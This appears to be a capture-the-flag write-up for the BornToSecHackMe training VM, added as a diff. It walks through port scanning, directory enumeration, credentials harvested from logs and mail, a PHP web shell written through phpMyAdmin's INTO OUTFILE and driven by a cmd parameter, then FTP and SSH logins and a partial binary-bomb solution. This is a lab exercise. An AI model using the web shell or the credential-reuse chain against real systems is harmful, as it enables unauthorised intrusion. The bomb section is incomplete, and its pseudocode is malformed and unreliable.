@@ -1,0 +1,279 @@
+Find ip address of the vm with the script or with ifconfig before and after launching the vm.
+Then find the opened port with nmap [ip].
+
+➜  ~ nmap 192.168.0.20
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 06:58 CET
+Nmap scan report for 192.168.0.20
+Host is up (0.00012s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+
+Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
+
+Then we use gobuster to find the directories contained in this web server.
+
+➜  ~ gobuster dir -k -u https://192.168.0.20 -w dirb/wordlists/big.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://192.168.0.20
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                dirb/wordlists/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/06 06:55:29 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 403) [Size: 289]
+/forum                (Status: 301) [Size: 314] [--> https://192.168.0.20/forum/]
+/phpmyadmin           (Status: 301) [Size: 319] [--> https://192.168.0.20/phpmyadmin/]
+/server-status        (Status: 403) [Size: 294]
+/webmail              (Status: 301) [Size: 316] [--> https://192.168.0.20/webmail/]
+
+===============================================================
+2021/12/06 06:55:34 Finished
+===============================================================
+
+On the forum we find a supectfull thread :
+
+Probleme login ? - lmezard, 2015-10-08, 00:10
+
+By searching in the log the thread contained we find this lines:
+
+ct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
+Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
+Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
+
+With "lmezard" as id and "!q\]Ej?*5K5cy*AJ" as password, we succeed connecting to lmezard account on the forum.
+
+We find her mail address : laurie@borntosec.net
+We connect to her mail box and we find this mail :
+
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+
+We connect to the database phpmyadmin with this credentials.
+We will create a backdoor by creating a new database and putting an exploit in the sql query code :
+
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
+
+This will create an OS command shell vulnerability.
+And with that we will be capable of wandering inside the directories of the virtual machine and get some info.
+
+To do that we connect to https://192.168.0.20/forum/templates_c/backdoor.php and we add a request :
+
+https://192.168.0.20/forum/templates_c/backdoor.php?cmd=pwd
+
+/var/www/forum/templates_c
+
+we find in /home/LOOKATME a password file, we change it's right with chmod and we cat it, to obtain the couple of id:passwd :
+
+lmezard:G!@M6f4Eatau{sF"
+
+We connect in ftp to the port 21.
+
+ftp lmezard@192.168.0.20
+Connected to 192.168.0.20.
+220 Welcome on this server
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp>
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+
+We GET the two files and we see this in the README :
+
+cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+We check the fun file and we find this while searching inside :
+...
+printf("Hahahaha Got you!!!\n");
+int main() {
+printf("M");
+printf("Y");
+printf(" ");
+printf("P");
+printf("A");
+printf("S");
+printf("S");
+printf("W");
+printf("O");
+printf("R");
+printf("D");
+printf(" ");
+printf("I");
+printf("S");
+printf(":");
+printf(" ");
+printf("%c",getme1()); 
+printf("%c",getme2());
+printf("%c",getme3());
+printf("%c",getme4());
+printf("%c",getme5());
+printf("%c",getme6());
+printf("%c",getme7());
+printf("%c",getme8());
+printf("%c",getme9());
+printf("%c",getme10());
+printf("%c",getme11());
+printf("%c",getme12());
+printf("\n");
+printf("Now SHA-256 it and submit");
+...
+
+➜  ~ strings fun | grep "char getme"
+char getme1() = 'I'
+char getme2() = 'h'
+char getme3() = 'e'
+char getme4() = 'a'
+char getme5() = 'r'
+char getme6() = 't'
+char getme7() = 'p'
+char getme8() = 'w'
+char getme9() = 'n'
+char getme10() = 'a' 
+char getme11() = 'g'
+char getme12() = 'e'
+
+➜  ft_fun grep "char getme1()" *
+331ZU.pcap:char getme1() {
+➜  ft_fun cat 331ZU.pcap
+char getme1() {
+
+//file5%
+
+➜  ft_fun grep "//file6" *
+...
+APM1E.pcap://file6
+...
+
+➜  ft_fun cat APM1E.pcap
+	return 'I';
+
+//file6%
+
+➜  ft_fun grep "//file7" *
+...
+FXG1L.pcap://file7
+...
+
+➜  ft_fun cat FXG1L.pcap
+}
+
+//file7%
+
+To decode the getme, we need to concatenate the content the file containing the next reference, like //file5=>//file6=>//file7.
+For getme1() we obtain :
+
+char getme1(){
+    return 'I';
+}
+
+So our final password is a hash SHA-256 of "Iheartpwnage" => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 
+
+We try to connect in ssh with this credentials :
+
+➜  ~ ssh -p 22 laurie@192.168.0.20
+laurie@192.168.0.20's password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+laurie@BornToSecHackMe:~$ ls -l
+total 27
+-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
+-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+
+We used ghidra to disassemble and decompile bomb, it helped us in resolving
+this puzzle.
+
+To pass phase 1 we need to write "Public speaking is very easy."
+To pass phase 2 we need to write "1 2 6 24 120 720".
+To pass phase 3 we need to write "0 q 777" but there is 9 different answer
+possible.
+
+*****************************************************************************
+func4 :
+
+while (n > 1) {
+    if (n == 1)
+        ret = 1;
+    else
+        tmp = func4(n - 1);
+        tmp2 = func4(n - 2);
+        ret = tmp + tmp2;
+    return ret;
+}
+*****************************************************************************
+To pass phase 4 we need to write "9".
+
+*****************************************************************************
+(gdb) x 0x804b220
+0x804b220 <array.123>:	 "isrveawhobpnutfg\260\001"
+A & 0xf is applied on our string of 6 characters and it utilise the result
+as an index on this string : "isrveawhobpnutfg\260\001"
+We need to obtain "giants". g = 0xf, i = 0x0 , a = 0x5 , n = 0xb, t = 0xd, 
+s = 0x1. We have many answers possible.
+*****************************************************************************
+To pass phase 5 we need to write "'giants' & 0xf == "?05+-1"
+
+*****************************************************************************
+(gdb) x /100wx 0x0804b220
+0x804b220 <array.123>:	0x76727369	0x68776165	0x6e70626f	0x67667475
+0x804b230 <node6>:	0x000001b0	0x00000006	0x00000000	0x000000d4
+0x804b240 <node5+4>:	0x00000005	0x0804b230	0x000003e5	0x00000004
+0x804b250 <node4+8>:	0x0804b23c	0x0000012d	0x00000003	0x0804b248
+0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b254	0x000000fd
+0x804b270 <node1+4>:	0x00000001	0x0804b260	0x000003e9	0x00000000
+0x804b280 <n48+8>:	0x00000000	0x0000002f	0x00000000	0x00000000
+0x804b290 <n43>:	0x00000014	0x00000000	0x00000000	0x00000007
+0x804b2a0 <n42+4>:	0x00000000	0x00000000	0x00000023	0x00000000
+0x804b2b0 <n44+8>:	0x00000000	0x00000063	0x00000000	0x00000000
+0x804b2c0 <n41>:	0x00000001	0x00000000	0x00000000	0x00000028
+0x804b2d0 <n45+4>:	0x00000000	0x00000000	0x0000006b	0x0804b2b4
+0x804b2e0 <n34+8>:	0x0804b278	0x00000006	0x0804b2c0	0x0804b29c
+0x804b2f0 <n33>:	0x0000002d	0x0804b2cc	0x0804b284	0x00000016
+0x804b300 <n32+4>:	0x0804b290	0x0804b2a8	0x00000032	0x0804b2f0
+0x804b310 <n22+8>:	0x0804b2d8	0x00000008	0x0804b2e4	0x0804b2fc
+0x804b320 <n1>:	0x00000024	0x0804b314	0x0804b308	0x00000000
+0x804b330:	0x00000000	0x00000000	0x00000000	0x00000000
+*****************************************************************************
+To pass phase 6 we need to write "".
+
+To pass secret phase we need to ?
+
+Public speaking is very easy.
+1 2 6 24 120 720
+0 q 777
+9
+?05+-1
